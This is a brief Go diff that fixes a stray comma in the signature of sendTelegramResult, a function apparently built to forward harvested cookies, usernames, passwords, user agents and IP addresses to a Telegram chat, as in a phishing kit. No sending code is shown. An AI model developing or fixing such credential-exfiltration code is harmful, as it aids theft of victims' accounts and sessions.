@@ -45,7 +45,7 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-func sendTelegramResult(cookies string, username string, password string, , useragent string, remote_addr string) {
+func sendTelegramResult(cookies string, username string, password string,  useragent string, remote_addr string) {
 
 	// Send the message
 	var err error
